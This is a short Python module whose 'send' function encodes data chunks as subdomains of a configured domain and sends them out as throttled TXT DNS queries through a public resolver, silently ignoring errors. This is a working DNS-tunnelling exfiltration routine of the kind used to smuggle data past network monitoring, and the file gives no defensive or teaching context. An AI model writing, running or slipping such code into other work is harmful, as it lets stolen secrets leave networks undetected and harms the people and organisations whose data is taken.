from dnslib import DNSRecord, QTYPE
import time
import socket

def send(chunks, config):
    domain = config["dns_domain"]
    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{domain}"
        q = DNSRecord.question(subdomain, qtype="TXT")
        try:
            q.send("8.8.8.8", 53, timeout=1)
        except Exception:
            pass
        time.sleep(config["throttle_seconds"])
